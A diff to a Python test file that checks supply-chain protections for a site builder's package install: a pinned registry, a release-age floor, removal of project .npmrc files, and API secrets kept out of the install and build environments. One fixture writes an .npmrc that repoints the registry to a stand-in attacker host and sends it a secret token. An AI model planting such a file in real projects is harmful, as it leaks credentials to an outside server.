@@ -1,4 +1,9 @@
 # tests/ee/sites/test_generator_client_supply_chain.py
+# The API-host install (``_SubprocessRunner``) keeps the 7-day release-age floor and
+# ignoreScripts via ``bun_supply_chain.HOST_BUNFIG``. Since 2026-10-07 the Daytona
+# sandbox installs with an OPEN bunfig (author packages, sandbox as isolation); the
+# host only ever installs our toolchain, so the floor stays here.
+#
 # Created: 2026-09-12 (fix/sites-install-supply-chain-floor) — reproduce-first
 # coverage for "the release-age floor is enforced on one of two build paths".
 #
@@ -51,6 +56,8 @@ def _spawn_observer(tmp_path, observed: dict):
 
     async def _fake_exec(*_args, **kwargs):
         bunfig = tmp_path / bsc.BUILD_BUNFIG_REL
+        observed["env"] = kwargs.get("env")
+        observed["npmrc"] = (tmp_path / ".npmrc").exists()
         observed["present"] = bunfig.is_file()
         observed["contents"] = bunfig.read_text(encoding="utf-8") if bunfig.is_file() else ""
         return await real_exec(
@@ -68,7 +75,7 @@ def _spawn_observer(tmp_path, observed: dict):
 async def test_install_writes_the_supply_chain_bunfig_before_spawning(tmp_path, monkeypatch):
     """The reproduced bug: the local runner installed with no floor at all.
 
-    THE MUTATION THAT BREAKS THIS: delete the ``_write_build_bunfig`` call from
+    THE MUTATION THAT BREAKS THIS: delete the ``write_host_bunfig`` call from
     ``install``. The snapshot then reports no bunfig at spawn and this fails — which
     is precisely the state every Coolify-hosted publish was in before this change.
     """
@@ -137,11 +144,11 @@ def test_the_floor_participates_in_the_install_cache_decision(tmp_path) -> None:
     (tmp_path / "package.json").write_text('{"name":"paw-site-x"}', encoding="utf-8")
     unfloored = _install_inputs_hash(str(tmp_path))
 
-    bsc.write_build_bunfig(tmp_path)
+    bsc.write_host_bunfig(tmp_path)
     floored = _install_inputs_hash(str(tmp_path))
 
     (tmp_path / bsc.BUILD_BUNFIG_REL).write_text(
-        bsc.BUILD_BUNFIG.replace("604800", "60"), encoding="utf-8"
+        bsc.HOST_BUNFIG.replace("604800", "60"), encoding="utf-8"
     )
     weakened = _install_inputs_hash(str(tmp_path))
 
@@ -152,15 +159,87 @@ def test_the_floor_participates_in_the_install_cache_decision(tmp_path) -> None:
     assert weakened != floored, "changing the floor's VALUE did not move the fingerprint"
 
 
-def test_both_runners_enforce_one_policy_not_two() -> None:
-    """The floor is one constant with two call sites, not two constants that agree today.
-
-    ``daytona_runner`` re-exports these under its original ``SANDBOX_*`` names (the same
-    re-export pattern ``sites_create`` uses for ``react_paths``), so nothing that imported
-    them from there had to change. Identity, not equality: two separately-maintained
-    strings that happen to match is the drift this asserts against.
+def test_the_sandbox_and_the_host_get_different_bunfigs_from_one_module() -> None:
+    """The sandbox bunfig is open and the host one is floored, both defined in
+    ``bun_supply_chain``. ``daytona_runner`` re-exports the sandbox one under its
+    ``SANDBOX_*`` names; identity, not equality, so the two cannot drift apart.
     """
     from pocketpaw_ee.sites import daytona_runner as dr
 
     assert dr.SANDBOX_BUNFIG is bsc.BUILD_BUNFIG
     assert dr.SANDBOX_BUNFIG_REL is bsc.BUILD_BUNFIG_REL
+    assert "minimumReleaseAge" not in dr.SANDBOX_BUNFIG
+    assert "minimumReleaseAge = 604800" in bsc.HOST_BUNFIG
+
+
+def test_the_host_bunfig_pins_the_public_registry() -> None:
+    assert 'registry = "https://registry.npmjs.org/"' in bsc.HOST_BUNFIG
+
+
+@pytest.mark.asyncio
+async def test_a_project_npmrc_is_removed_before_the_host_install(tmp_path, monkeypatch):
+    """An .npmrc can repoint the registry and send it a token read from the host env."""
+    (tmp_path / "package.json").write_text('{"name":"paw-site-x"}', encoding="utf-8")
+    (tmp_path / ".npmrc").write_text(
+        "registry=https://evil.example/\n//evil.example/:_authToken=${SECRET}\n",
+        encoding="utf-8",
+    )
+    observed: dict = {}
+    monkeypatch.setattr(asyncio, "create_subprocess_exec", _spawn_observer(tmp_path, observed))
+
+    ok, msg = await asyncio.wait_for(_SubprocessRunner().install(str(tmp_path)), timeout=10)
+    assert ok is True, msg
+    assert observed["npmrc"] is False, "bun install spawned with the project .npmrc in place"
+
+
+@pytest.mark.asyncio
+async def test_the_host_install_runs_without_api_secrets(tmp_path, monkeypatch):
+    monkeypatch.setenv("PAW_TEST_SENTINEL_SECRET", "s3cret")
+    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "s3cret")
+    (tmp_path / "package.json").write_text('{"name":"paw-site-x"}', encoding="utf-8")
+    observed: dict = {}
+    monkeypatch.setattr(asyncio, "create_subprocess_exec", _spawn_observer(tmp_path, observed))
+
+    ok, msg = await asyncio.wait_for(_SubprocessRunner().install(str(tmp_path)), timeout=10)
+    assert ok is True, msg
+    env = observed["env"]
+    assert env is not None, "bun install inherited the API's full environment"
+    assert "PAW_TEST_SENTINEL_SECRET" not in env
+    assert "AWS_SECRET_ACCESS_KEY" not in env
+    assert "s3cret" not in env.values()
+    assert any(k.upper() == "PATH" for k in env)
+
+
+@pytest.mark.asyncio
+async def test_the_host_build_runs_without_api_secrets(tmp_path, monkeypatch):
+    from pocketpaw_ee.sites import generator_client as gc
+
+    monkeypatch.setenv("PAW_TEST_SENTINEL_SECRET", "s3cret")
+    monkeypatch.setattr(gc, "reap_build_workerd", lambda _d: None)
+    observed: dict = {}
+    monkeypatch.setattr(asyncio, "create_subprocess_exec", _spawn_observer(tmp_path, observed))
+
+    ok, msg = await asyncio.wait_for(
+        _SubprocessRunner().build_static(str(tmp_path), gate=False), timeout=10
+    )
+    assert ok is True, msg
+    assert observed["env"] is not None
+    assert "PAW_TEST_SENTINEL_SECRET" not in observed["env"]
+
+
+def test_host_build_env_keeps_toolchain_vars_and_drops_the_rest() -> None:
+    env = bsc.host_build_env(
+        {"Path": "/bin", "SystemRoot": "C:/Windows", "TEMP": "/t", "DATABASE_URL": "x"}
+    )
+    assert env == {"Path": "/bin", "SystemRoot": "C:/Windows", "TEMP": "/t"}
+
+
+def test_npmrc_and_bunfig_are_install_inputs(tmp_path) -> None:
+    from pocketpaw_ee.sites.generator_client import _install_inputs_hash
+
+    (tmp_path / "package.json").write_text('{"name":"paw-site-x"}', encoding="utf-8")
+    base = _install_inputs_hash(str(tmp_path))
+    (tmp_path / ".npmrc").write_text("save-exact=true\n", encoding="utf-8")
+    with_npmrc = _install_inputs_hash(str(tmp_path))
+    (tmp_path / bsc.BUILD_BUNFIG_REL).write_text("[install]\n", encoding="utf-8")
+    assert len({base, with_npmrc, _install_inputs_hash(str(tmp_path))}) == 3
